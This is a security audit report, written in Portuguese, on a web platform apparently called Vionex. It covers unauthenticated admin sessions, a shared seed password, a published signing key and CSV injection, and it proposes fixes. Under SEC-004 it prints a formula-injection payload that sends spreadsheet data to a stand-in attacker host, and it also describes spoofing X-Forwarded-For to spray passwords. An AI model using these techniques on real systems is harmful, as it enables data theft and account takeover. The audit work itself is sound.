# 03 — Auditoria de segurança

Referências: OWASP Top 10 (2021), OWASP ASVS 4.0, OWASP API Security Top 10.
Metodologia: análise estática e arquitetural. **Nenhum teste destrutivo, nenhum
pentest, nenhuma requisição contra produção.**

## Resumo

O sistema tem um desenho de segurança acima da média para o seu estágio: escopo
composto dentro da consulta, cookie que carrega só identidade, throttle de login
no banco, cabeçalhos de segurança completos, CSP com nonce. Esses acertos são
reais e devem ser preservados.

O que o impede de ir a produção não é uma fraqueza estrutural — é um **portão
deliberadamente aberto** que nunca foi fechado, somado a uma senha de seed
publicada.

## SEC-001 — `/demo/enter` emite sessão de administrador sem senha · **CRITICAL** · bloqueia produção

**Evidência:** `src/lib/demo.ts`, função `isDemoEnabled()`:

```ts
export function isDemoEnabled(): boolean {
  return true;
}
```

`src/app/demo/enter/route.ts` verifica `isDemoEnabled()` e, passando, executa
`createSessionToken()` para qualquer uma das 8 contas do mapa `DEMO_ACCOUNTS` —
incluindo `admin@vionex.com`.

Um `GET https://<host>/demo/enter?as=admin` devolve um cookie de sessão ADMIN
válido. Sem senha, sem MFA, sem throttle, em qualquer ambiente, inclusive
produção. Não há variável de ambiente que desligue isso: a função retorna `true`
literal.

O comentário do próprio arquivo já não descreve o comportamento — diz
*"Available in development, and in a deployment that sets DEMO_MODE. Anywhere
else it is a 404"*, o que deixou de ser verdade. Divergência entre controle de
segurança e sua documentação é, por si só, um achado.

**Pior caso:** comprometimento total. Leitura e escrita de todos os projetos,
documentos, fornecedores e usuários; criação de usuários; download de qualquer
arquivo.

**Nota de contexto:** esta foi uma decisão explícita e consciente para permitir a
avaliação visual da plataforma sem credenciais. É correta para uma demonstração
com dados fictícios e inaceitável no instante em que o primeiro dado real de
fornecedor entrar. Está registrada como bloqueador nº 1, não como descuido.

**Status:** CONFIRMED.

## SEC-002 — Todas as contas do snapshot compartilham a senha `vionex123` · **CRITICAL** · bloqueia produção

**Evidência:** `scripts/build-demo-snapshot.mjs` chama
`seedDemoData(client, { password: "vionex123", storage: null })`. Esse snapshot é
gerado no build (`"build": "npm run demo:snapshot && next build"` em
`package.json`) e embarcado no bundle. Quando não há `DATABASE_URL`,
`src/server/demo/embedded-db.ts` carrega esse snapshot como o banco da aplicação.

Ou seja: o deploy atual serve um banco em que **todos os 8 usuários, inclusive o
ADMIN, têm a senha `vionex123`** — e a tela de login em `/login` está ativa e
aceita essa senha.

Esse é um segundo caminho de comprometimento total, independente do SEC-001.
Fechar apenas um dos dois não resolve.

Em `prisma/seed.ts` o comportamento é melhor (`randomBytes(12)` quando remoto),
mas esse caminho não é o que alimenta o deploy.

**Status:** CONFIRMED.

## SEC-003 — Chave de assinatura de sessão publicada no repositório · **CRITICAL** · bloqueia produção

**Evidência:** `src/lib/env-schema.ts`:

```ts
export const DEMO_SIGNING_KEY = "vionex-projects-demonstration-signing-key-not-secret";
```

`AUTH_SECRET` é opcional e assume esse valor por padrão. Quem tiver o
repositório — que está no GitHub — pode **forjar um JWT válido** para qualquer
`sub`/`org` e obter a sessão de qualquer usuário.

O `/api/health` reporta isso honestamente como warning, o que é um bom sinal de
higiene, mas não muda o risco.

**Terceiro caminho independente para comprometimento total.**

**Status:** CONFIRMED.

## SEC-004 — Injeção de fórmula em CSV · **HIGH**

**Evidência:** `src/lib/csv.ts`, função `toCsv`:

```ts
return /[",\n;]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
```

O escape trata apenas o *formato* CSV. Não neutraliza os caracteres que fazem o
Excel, o LibreOffice e o Google Sheets interpretarem a célula como fórmula:
`=`, `+`, `-`, `@`, TAB e CR.

`src/app/api/reports/[report]/route.ts` exporta `project.name`,
`supplier.name`, `request.title` e `document.name`. **Todos são texto controlado
pelo fornecedor** — um fornecedor pode nomear um documento
`=HYPERLINK("http://attacker/"&A1,"Abrir")` e, quando um funcionário da Vionex
abre o CSV exportado, a planilha executa.

Caminho de ataque completo: parte externa controla o dado → dado atravessa a
exportação sem neutralização → executa na máquina de um funcionário interno.

**Mitigação usual:** prefixar com aspa simples ou espaço qualquer célula que
comece com um desses caracteres.

**Status:** CONFIRMED.

## SEC-005 — Throttle por IP é contornável via `X-Forwarded-For` · **HIGH**

**Evidência:** `src/server/auth/throttle.ts`, função `clientIp()`:

```ts
const forwarded = store.get("x-forwarded-for");
if (forwarded) {
  const first = forwarded.split(",")[0]?.trim();
  if (first) return first;
}
```

Pega a entrada mais à esquerda de `X-Forwarded-For` **sem validar a cadeia de
proxies confiáveis**. Esse é um valor que o cliente escreve. Enviando um IP
aleatório a cada tentativa, o limite de 20 por IP (`MAX_PER_IP`) nunca é
atingido.

Sobra apenas o limite por e-mail (`MAX_PER_EMAIL = 8` em 10 minutos), que
continua valendo — então ataque a uma conta específica está contido, mas
**password spraying** (uma senha comum contra muitas contas) fica livre.

Correção conhecida: em plataformas com proxy fixo, contar da direita para a
esquerda pulando N proxies confiáveis, ou usar o cabeçalho que a plataforma
assina.

**Status:** CONFIRMED.

## SEC-006 — Nenhuma verificação do conteúdo real do arquivo enviado · **HIGH**

**Evidência:** `src/lib/upload.ts`, função `validateUpload`:

```ts
const allowedExtensions = ALLOWED_FILE_TYPES[file.type];
```

`file.type` é o MIME **declarado pelo cliente**. Não há leitura de magic bytes,
nem verificação de estrutura, nem antivírus. A conferência extensão × MIME é
boa e barra o erro honesto, mas ambos os lados são fornecidos pelo atacante.

A lista de tipos é restritiva (`pdf`, `docx`, `xlsx`, `pptx`, `png`, `jpeg`) e
**não inclui SVG nem HTML**, o que — somado ao `X-Content-Type-Options: nosniff`
em `src/app/api/files/[versionId]/route.ts` — fecha o caminho de XSS armazenado.
Esse ponto está bem resolvido.

O risco que permanece é **distribuição de malware**: uma conta de fornecedor
comprometida envia um `.docx` ou `.xlsx` com macro, e um funcionário da Vionex
baixa e abre. A plataforma existe justamente para trocar documentos com partes
externas, então esse é o caminho mais natural de ataque contra a Vionex.

**Status:** CONFIRMED.

## SEC-007 — Sem MFA e sem invalidação de sessão · **HIGH**

**Evidência:** nenhuma ocorrência de TOTP, WebAuthn, `mfa` ou `2fa` no
repositório. `src/server/auth/session.ts` emite JWT autocontido; o modelo `User`
em `prisma/schema.prisma` não tem `tokenVersion`, `sessionsValidFrom` nem tabela
de sessões.

Consequências concretas:

- Trocar a senha **não** invalida sessões existentes. Um token roubado continua
  válido por até **30 dias** (`REMEMBERED_SESSION_SECONDS`).
- Não existe "encerrar todas as sessões".
- O único desligamento efetivo é `status != ACTIVE`, que `getCurrentUser()`
  verifica a cada requisição — isso funciona e é um acerto —, mas desativar a
  conta inteira é uma resposta grosseira a um vazamento de token.
- Sem MFA num painel administrativo acessível da internet inteira.

**Status:** CONFIRMED.

## SEC-008 — Mensagens de erro internas chegam ao usuário · **MEDIUM**

**Evidência:** `src/server/actions/utils.ts`, função `toActionError`:

```ts
if (error instanceof Error && error.message && error.message.length < 200) {
  return { error: error.message };
}
```

A intenção é boa (serviços lançam `Error` com mensagem destinada ao usuário — ver
ARCH-002), mas a regra é "qualquer erro curto". Um erro de driver
(`connect ECONNREFUSED 10.0.0.5:5432`), de Prisma
(`relation "Document" does not exist`) ou de `node:fs` cabe em 200 caracteres e
é renderizado na tela.

Isso entrega topologia interna, nomes de host e detalhes de schema a quem só
precisava ver "não foi possível salvar".

**Status:** CONFIRMED.

## SEC-009 — `/api/health` é público e descritivo · **MEDIUM**

**Evidência:** `src/app/api/health/route.ts` não chama `getCurrentUser()`.

Quando a configuração está errada, responde 503 listando os **nomes** das
variáveis problemáticas. Quando está certa, informa driver de storage, se o banco
é embutido e — pelos `warnings` — se `AUTH_SECRET` é a chave publicada.

Os valores nunca aparecem, o que é a decisão certa. Ainda assim é
reconhecimento gratuito: um atacante descobre, sem autenticar, que o alvo roda
com a chave de assinatura pública.

**Status:** CONFIRMED.

## SEC-010 — Sem rate limit fora do login · **MEDIUM**

`/api/search` (`src/app/api/search/route.ts`), `/api/files/[versionId]` e as 12
server actions não têm limite algum. `/api/files` lê o objeto inteiro em memória
(ver STO-002), então um laço de downloads é um vetor de exaustão de recursos e
de custo.

**Status:** CONFIRMED.

## SEC-011 — CSP não se aplica às rotas de API · **LOW**

**Evidência:** `src/proxy.ts`, `config.matcher` exclui `api`. Documentos
entregues por `/api/files/[versionId]` chegam sem CSP.

Na prática o impacto é baixo porque a lista de MIME permitidos não tem tipos
executáveis e há `nosniff`. Registrado como defesa em profundidade ausente.

**Status:** CONFIRMED.

## O que está correto — e não deve ser mexido

| Controle | Evidência |
|---|---|
| Cabeçalhos de segurança completos | `next.config.ts`: HSTS (2 anos, preload), `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, COOP, CORP |
| CSP com nonce por requisição + `strict-dynamic` | `src/proxy.ts` |
| `Cache-Control: private, no-store` em tudo que não é asset | `next.config.ts` |
| Cookie `httpOnly` + `SameSite=lax` + `Secure` em produção | `src/server/auth/session.ts` |
| Cookie carrega só identidade; papel relido do banco | `src/server/auth/current-user.ts` |
| Hash com bcrypt custo 12 | `src/server/auth/password.ts` |
| Defesa contra enumeração de usuários (hash dummy de custo igual) | `src/server/actions/auth.ts`, `DUMMY_HASH` |
| Throttle de login persistido no banco (não em memória) | `src/server/auth/throttle.ts` |
| Proteção contra open redirect | `src/app/demo/enter/route.ts`, `safeDestination` |
| Proteção contra path traversal no storage local | `src/lib/storage/local.ts`, `resolveKey` |
| Chaves de storage imprevisíveis (`randomUUID`) | `src/lib/storage/index.ts`, `buildStorageKey` |
| Nenhum SQL com interpolação de string | verificado em todo `src/server/` |
| `poweredByHeader: false` | `next.config.ts` |
| Nenhum segredo real versionado | `git grep` por padrões de credencial: só placeholders em `.env.example`, `ci/` e `tests/` |

## CSRF

Server actions do Next 16 verificam a origem por padrão, e o cookie é
`SameSite=lax`. Os route handlers são todos `GET` e não mudam estado — exceto
`/demo/enter`, que emite sessão via GET (subsumido por SEC-001).

Sem token CSRF explícito. Considerado **adequado** para o desenho atual, desde
que nenhum handler `POST` seja adicionado sem verificação de origem.
